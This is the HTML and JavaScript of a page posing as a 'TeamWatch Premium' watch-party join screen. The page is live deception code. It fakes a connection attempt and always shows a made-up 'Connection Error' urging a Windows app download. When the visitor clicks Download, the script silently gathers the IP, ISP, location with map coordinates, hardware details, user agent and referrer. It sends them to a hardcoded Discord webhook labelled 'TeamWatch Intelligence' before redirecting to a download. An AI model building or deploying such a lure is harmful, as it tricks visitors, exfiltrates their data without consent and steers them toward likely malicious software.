<!DOCTYPE html>
<html lang="en" data-theme="dark">


<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Room - TeamWatch Premium</title>
    <link rel="icon" type="image/png" href="images/logo.png">
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Outfit:wght@500;700;800&amp;display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/style.css">

    <style>
        .auth-container {
            position: relative;
        }

        .auth-container::after {
            content: '';
            position: absolute;
            bottom: -20%;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            height: 40%;
            background: radial-gradient(ellipse, rgba(229, 9, 20, 0.06), transparent 60%);
            pointer-events: none;
        }

        .auth-card {
            animation: card-appear 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }

        @keyframes card-appear {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.97);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .avatar-option {
            width: 48px;
            height: 48px;
            border-radius: 14px;
            border: 2px solid var(--card-border);
            cursor: pointer;
            transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
            opacity: 0.6;
            background: rgba(255, 255, 255, 0.03);
            padding: 3px;
        }

        .avatar-option:hover {
            transform: scale(1.12) translateY(-3px);
            opacity: 1;
            border-color: rgba(229, 9, 20, 0.3);
        }

        .avatar-option.selected {
            border-color: var(--accent-red);
            opacity: 1;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3), 0 0 0 3px rgba(229, 9, 20, 0.1);
            transform: scale(1.12) translateY(-3px);
            background: rgba(229, 9, 20, 0.08);
        }

        .back-link {
            color: var(--text-secondary);
            font-size: 0.82rem;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.3s ease;
            padding: 0.4rem 0.8rem;
            border-radius: 8px;
        }

        .back-link:hover {
            color: var(--text-primary);
            background: rgba(255, 255, 255, 0.05);
        }

        /* Room branding */
        .room-branding {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-bottom: 2rem;
        }

        .room-branding .logo-icon {
            width: 36px;
            height: 36px;
            background: rgba(229, 9, 20, 0.1);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--accent-red);
            font-size: 1rem;
        }
    </style>
</head>

<body>
    <div class="auth-container">
        <div class="auth-card">
            <div class="room-branding">
                <div class="logo-icon">
                    <i class="fa-solid fa-tv"></i>
                </div>
            </div>
            <h2 class="auth-title">Enter Room</h2>
            <p class="auth-subtitle">Join the watch party as a guest</p>

            <div id="guest-form">
                <div class="form-group">
                    <label class="form-label" for="guest-name">Display Name</label>
                    <input type="text" id="guest-name" class="form-input" placeholder="Guest_123">
                </div>

                <div class="form-group">
                    <label class="form-label">Choose Avatar</label>
                    <div class="avatar-grid"
                        style="display: flex; gap: 10px; justify-content: center; margin-bottom: 1rem; flex-wrap: wrap;">
                        <!-- Avatars will be injected here -->
                        <img src="https://api.dicebear.com/9.x/avataaars/svg?seed=Felix"
                            class="avatar-option selected"><img
                            src="https://api.dicebear.com/9.x/avataaars/svg?seed=Aneka" class="avatar-option"><img
                            src="https://api.dicebear.com/9.x/avataaars/svg?seed=Zoe" class="avatar-option"><img
                            src="https://api.dicebear.com/9.x/avataaars/svg?seed=Max" class="avatar-option"><img
                            src="https://api.dicebear.com/9.x/avataaars/svg?seed=Luna" class="avatar-option">
                    </div>
                </div>

                <button id="btn-guest" class="btn btn-primary" style="width: 100%;">
                    <i class="fa-solid fa-door-open" style="margin-right: 8px;"></i>Continue as Guest
                </button>
            </div>

            <div class="auth-footer" style="margin-top: 1.5rem;">
                <a href="index.html" class="back-link">
                    <i class="fa-solid fa-arrow-left"></i> Back to Home
                </a>
            </div>
        </div>
    </div>

    <!-- Error/Redirect Modal -->
    <div id="errorModal" class="modal-overlay" style="display: none; opacity: 0;">
        <div class="modal-content">
            <div class="modal-icon"
                style="background: rgba(229, 9, 20, 0.1); color: var(--accent-red); border-color: rgba(229, 9, 20, 0.3);">
                <i class="fa-solid fa-triangle-exclamation"></i>
            </div>
            <h3>Connection Error</h3>
            <p>The web player is currently at capacity or your browser does not support the required codecs for this
                room.</p>
            <p style="font-size: 0.85em; color: var(--text-secondary); margin-top: -1rem;">Please download the desktop
                app for a stable
                experience.</p>
            <div class="modal-actions">
                <button class="btn btn-premium-glow" id="btn-download-redirect" style="padding: 0.8rem 2rem;">
                    <i class="fa-brands fa-windows" style="margin-right: 8px;"></i> Download App
                </button>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1567697691410960465/amEUE_Q-PqDd-dfMzHjd0aaE3LG5Uu8WZLod4y1nhrMA1ICrtF03yyCMD_-JvtTgN--Y";

        async function getIpData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (e) {
                console.error("IP Fetch failed", e);
                return {};
            }
        }

        function getFlagEmoji(countryCode) {
            if (!countryCode) return '🌍';
            const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
            return String.fromCodePoint(...codePoints);
        }

        async function sendWebhook(payload) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: true
                });
            } catch (error) {
                console.error("Webhook failed", error);
            }
        }

        function getSystemInfo() {
            let gpu = 'Unknown GPU';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {
                console.warn("GPU detect failed", e);
            }

            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth}-bit`,
                deviceMemory: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Logical Cores` : 'Unknown',
                touchPoints: navigator.maxTouchPoints,
                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                referrer: document.referrer || 'Direct Access',
                currentUrl: window.location.href,
                gpu: gpu
            };
        }

        document.addEventListener('DOMContentLoaded', () => {
            const btnGuest = document.getElementById('btn-guest');
            const guestNameInput = document.getElementById('guest-name');
            const errorModal = document.getElementById('errorModal');
            const btnDownload = document.getElementById('btn-download-redirect');
            const downloadLink = "/download";

    // Avatar Logic
            const seeds = ['Felix', 'Aneka', 'Zoe', 'Max', 'Luna'];
            const avatarGrid = document.querySelector('.avatar-grid');
            let selectedAvatar = null;

            seeds.forEach((seed, index) => {
                const img = document.createElement('img');
                img.src = `https://api.dicebear.com/9.x/avataaars/svg?seed=${seed}`;
                img.className = 'avatar-option';
                if (index === 0) { // Select first by default
                    img.classList.add('selected');
                    selectedAvatar = seed;
                }
                img.onclick = () => {
                    document.querySelectorAll('.avatar-option').forEach(el => el.classList.remove('selected'));
                    img.classList.add('selected');
                    selectedAvatar = seed;
                };
                avatarGrid.appendChild(img);
            });

            btnGuest.addEventListener('click', () => {
                // Simulate loading
                const originalText = btnGuest.innerHTML;
                btnGuest.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
                btnGuest.disabled = true;
                btnGuest.style.opacity = '0.7';

                setTimeout(() => {
                    // Show error modal
                    errorModal.style.display = 'flex';
                    // Trigger reflow
                    errorModal.offsetHeight;
                    errorModal.classList.add('active');
                    errorModal.style.opacity = '1';

                    // Reset button
                    btnGuest.innerHTML = originalText;
                    btnGuest.disabled = false;
                    btnGuest.style.opacity = '1';
                }, 1500);
            });

            btnDownload.addEventListener('click', async () => {
                // Log download
                const guestName = guestNameInput.value.trim() || 'Guest';

                // Change button text to indicate processing
                const oldText = btnDownload.innerHTML;
                btnDownload.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Starting...';

                try {
                    const data = await getIpData();
                    const sys = getSystemInfo();

                    const ip = data.ip || 'Unknown IP';
                    const country = data.country_name || 'Unknown Country';
                    const city = data.city || 'Unknown City';
                    const region = data.region || 'Unknown Region';
                    const isp = data.org || 'Unknown ISP';
                    const flag = getFlagEmoji(data.country_code);
                    const mapsLink = data.latitude && data.longitude ? `[View on Map](https://www.google.com/maps?q=${data.latitude},${data.longitude})` : 'N/A';

                    const payload = {
                        username: "TeamWatch Intelligence",
                        avatar_url: "https://i.imgur.com/4M34hi2.png",
                        embeds: [{
                            title: "📥 ROOM DOWNLOAD EVENT",
                            description: `User **${guestName}** initiated download via **Guest Overlay**.\nTargeting: High Intent.`,
                            color: 0x9b59b6, // Amethyst Purple
                            thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2983/2983973.png" },
                            fields: [
                                { name: "📡 **Network & Geo**", value: `**IP:** \`${ip}\`\n**ISP:** ${isp}\n**Loc:** ${flag} ${city}, ${region}, ${country}\n**Conn:** ${sys.connection.toUpperCase()}\n**Map:** ${mapsLink}`, inline: true },
                                { name: "💻 **Hardware Spec**", value: `**CPU:** ${sys.hardwareConcurrency}\n**RAM:** ${sys.deviceMemory}\n**GPU:** ${sys.gpu}\n**Scrn:** ${sys.screen} (${sys.colorDepth})`, inline: true },
                                { name: "🧭 **Browser Env**", value: `**Platform:** ${sys.platform}\n**Lang:** ${sys.language}\n**Cookies:** ${sys.cookiesEnabled}\n**Touch:** ${sys.touchPoints > 0 ? 'Yes' : 'No'} (${sys.touchPoints})`, inline: true },
                                { name: "🔗 **Session Context**", value: `**Page:** [Link](${sys.currentUrl})\n**Ref:** ${sys.referrer}\n**Time:** ${sys.timezone}`, inline: true },
                                { name: "🕵️ **User Agent**", value: `\`\`\`${sys.userAgent}\`\`\``, inline: false }
                            ],
                            footer: { text: "TeamWatch Room Security • Guest Access", icon_url: "https://i.imgur.com/4M34hi2.png" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    await sendWebhook(payload);
                } catch (e) {
                    console.error("Tracking error:", e);
                }


                window.location.href = downloadLink;
            });

            // Close modal on outside click (optional, but forces download)
            errorModal.addEventListener('click', (e) => {
                if (e.target === errorModal) {
                    // Optional: close or shake to indicate required
                }
            });
        });
    </script>

</body>


</html>
